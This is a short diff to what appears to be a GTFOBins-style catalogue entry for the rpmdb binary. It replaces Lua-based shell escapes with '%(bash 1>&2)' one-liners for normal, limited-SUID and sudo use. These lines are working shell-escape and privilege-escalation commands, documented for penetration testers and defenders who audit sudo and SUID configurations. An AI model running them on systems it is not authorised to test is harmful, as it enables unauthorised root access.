@@ -1,9 +1,9 @@
 ---
 functions:
   shell:
-    - code: rpmdb --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: rpmdb --eval '%(bash 1>&2)'
   limited-suid:
-    - code: ./rpmdb --eval '%{lua:os.execute("/bin/sh")}'
+    - code: ./rpmdb --eval '%(bash 1>&2)'
   sudo:
-    - code: sudo rpmdb --eval '%{lua:posix.exec("/bin/sh")}'
+    - code: sudo rpmdb --eval '%(bash 1>&2)'
 ---
